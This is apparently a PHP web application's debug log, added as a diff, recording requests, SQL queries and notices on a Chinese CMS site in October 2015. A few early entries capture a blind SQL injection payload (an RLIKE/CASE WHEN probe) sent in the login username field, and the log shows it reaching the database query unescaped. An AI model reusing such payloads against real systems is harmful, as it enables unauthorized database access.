+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000222s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.046167s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002298s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.048567s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.029572s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.078222s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.079831s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081276s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.082558s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006039s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.084359s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001657s ]
+
+[ 2015-10-14T12:42:19+08:00 ] ERR: (ThinkException) Got error 'parentheses not balanced' from regexp
+ [ SQL语句 ] : SELECT * FROM `wy_users` WHERE ( `username` = '1') RLIKE (SELECT (CASE WHEN (93317=93315764) THEN 1 ELSE 0x28 END)) AND ('Zgro'='Zgro' ) LIMIT 1  
+[ 2015-10-14T12:42:19+08:00 ] 121.42.0.39 /index.php?m=Users&a=checklogin
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001356s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001505s ]
+SQL: SHOW COLUMNS FROM `wy_users` [ RunTime:0.148341s ]
+SQL: SELECT * FROM `wy_users` WHERE ( `username` = '1') RLIKE (SELECT (CASE WHEN (93317=93315764) THEN 1 ELSE 0x28 END)) AND ('Zgro'='Zgro' ) LIMIT 1   [ RunTime:0.042443s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class UsersAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:42:39+08:00 ] 121.42.0.39 /index.php?m=Users&a=checklogin
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000836s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000974s ]
+SQL: SHOW COLUMNS FROM `wy_users` [ RunTime:0.032585s ]
+SQL: SELECT * FROM `wy_users` WHERE ( `username` = '1') RLIKE (SELECT (CASE WHEN (93317=93317) THEN 1 ELSE 0x28 END)) AND ('Zgro'='Zgro' ) LIMIT 1   [ RunTime:0.000821s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.063557s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002347s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.066040s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.035040s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.101115s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.102525s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.103978s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.105242s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005612s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.106824s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001664s ]
+
+[ 2015-10-14T13:37:41+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001079s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001254s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.006409s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000312s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.032091s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001644s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.033850s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020899s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.054822s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.055852s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.057082s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.057911s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.004164s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.059089s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001305s ]
+
+[ 2015-10-14T13:37:41+08:00 ] 121.42.0.39 /index.php
+NOTIC: [32] PHP Startup: Unable to load dynamic library 'D:\WebServer\php-5.2.5 (x64)\ext\php_fileinfo.dll' - �Ҳ���ָ����ģ�顣
+ Unknown 第 0 行.
+
+[ 2015-10-14T13:37:41+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000594s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000726s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.007548s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000266s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.023141s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000741s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.023974s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.009748s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.033780s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.034266s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.034807s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.035138s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001949s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.035822s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000712s ]
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000634s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000777s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.023681s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000204s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.042989s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000766s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.043834s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.009656s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.053575s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.054089s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.054697s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.055025s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002117s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.055790s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000739s ]
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000560s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000695s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.005243s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000200s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.022529s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000762s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.023371s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.011220s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.034663s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.035138s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.035695s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.036009s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001927s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.036683s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000715s ]
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000649s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000812s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.010100s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000232s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.027012s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000710s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.027801s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014153s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.042074s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.042571s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.043116s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.043431s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001960s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.044109s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000687s ]
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001459s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001730s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.007514s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000273s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.041334s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001894s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.043313s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025375s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.068759s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.069757s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.070985s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.072210s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.004633s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.073494s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001227s ]
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+NOTIC: [32] PHP Startup: Unable to load dynamic library 'D:\WebServer\php-5.2.5 (x64)\ext\php_fileinfo.dll' - �Ҳ���ָ����ģ�顣
+ Unknown 第 0 行.
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000567s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000706s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.013318s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000234s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.030500s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000734s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.031314s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.016857s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.048273s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.048810s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.049386s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.049707s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002122s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.050490s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000854s ]
+
+[ 2015-10-14T13:38:27+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000723s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000898s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004754s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000458s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.027021s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000768s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.027867s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010182s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.038134s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.038805s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.039377s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.039810s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002346s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.040581s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000781s ]
+
+[ 2015-10-14T13:38:40+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000575s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000707s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004879s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000227s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.019743s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000978s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.020776s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010118s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.030958s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.031531s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.032077s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.032475s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002093s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.033151s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000686s ]
+
+[ 2015-10-14T13:38:49+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000701s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000875s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.008700s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000203s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.027567s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000789s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.028438s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.011651s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.040222s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.040744s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.041348s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.041679s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002152s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.042443s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000744s ]
+
+[ 2015-10-14T13:38:49+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000709s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000851s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.019728s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000246s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.037559s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000848s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.038741s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.015838s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.054659s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.055200s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.055761s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.056112s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002046s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.056802s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000983s ]
+
+[ 2015-10-14T13:38:50+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000575s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000768s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004980s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000246s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.020478s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000747s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.021307s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.009767s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.031151s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.031715s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.032261s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.032640s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002064s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.033310s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000759s ]
+
+[ 2015-10-14T13:39:59+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001076s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001223s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004532s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000202s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.026147s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001672s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.027904s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014055s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.042116s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.043262s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.044476s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.045283s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.004456s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.046635s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001302s ]
+
+[ 2015-10-14T13:40:37+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000624s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000766s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004580s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000182s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.020581s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000775s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.021437s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.011231s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.032824s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.033582s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.034229s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.034589s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002668s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.035605s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000789s ]
+
+[ 2015-10-14T13:40:48+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000616s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000788s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.004544s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000214s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.020256s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000706s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.021100s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.013061s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.034253s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.034791s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.035590s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.035929s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002307s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.036645s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000958s ]
+
+[ 2015-10-14T13:40:59+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000642s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000787s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.011888s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000368s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.039423s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000783s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.040282s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014633s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.054987s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.055499s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.056032s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.056381s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001967s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.057099s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000744s ]
+
+[ 2015-10-14T13:40:59+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001261s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001443s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.010175s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000268s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.042252s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001633s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.043972s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.012402s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.056444s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.057480s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.058606s ]
